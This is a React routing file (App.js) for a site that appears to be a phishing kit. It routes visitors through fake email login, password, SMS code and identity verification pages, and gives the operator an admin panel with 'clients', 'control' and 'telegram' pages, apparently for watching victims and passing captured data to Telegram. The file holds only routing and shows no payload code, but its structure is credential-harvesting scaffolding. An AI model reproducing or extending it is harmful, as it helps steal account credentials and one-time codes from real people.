import React from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import MainLayout from './layouts/MainLayout';
import Home from './pages/Home';
import LoadingRedirect from './pages/LoadingRedirect';
import LoginEmail from './pages/LoginEmail';
import LoginPassword from './pages/LoginPassword';
import IdentityVerification from './pages/IdentityVerification';
import SuccessPage from './pages/SuccessPage';
import AdminLogin from './pages/AdminLogin';
import AdminDashboard from './pages/AdminDashboard';
import AdminClients from './pages/AdminClients';
import AdminControl from './pages/AdminControl';
import AdminTelegram from './pages/AdminTelegram';
import SMSVerification from './pages/SMSVerification';

export default function App() {
  return (
    <Router>
      <Routes>
        {/* Admin Section (No Header/Footer) */}
        <Route path="/admin" element={<AdminLogin />} />
        <Route path="/admin/dashboard" element={<AdminDashboard />} />
        <Route path="/admin/clients" element={<AdminClients />} />
        <Route path="/admin/control" element={<AdminControl />} />
        <Route path="/admin/telegram" element={<AdminTelegram />} />

        {/* Portal Section (With Header/Footer) */}
        <Route path="/" element={<MainLayout showSidebar={false}><Home /></MainLayout>} />
        <Route path="/redirect" element={<MainLayout showSidebar={false}><LoadingRedirect /></MainLayout>} />
        <Route path="/login-email" element={<MainLayout showSidebar={false}><LoginEmail /></MainLayout>} />
        <Route path="/login-password" element={<MainLayout showSidebar={false}><LoginPassword /></MainLayout>} />
        <Route path="/sms-verification" element={<MainLayout showSidebar={false}><SMSVerification /></MainLayout>} />
        <Route path="/identity-verification" element={<MainLayout showSidebar={false}><IdentityVerification /></MainLayout>} />
        <Route path="/success" element={<MainLayout showSidebar={false}><SuccessPage /></MainLayout>} />
        
        {/* Fallback */}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}
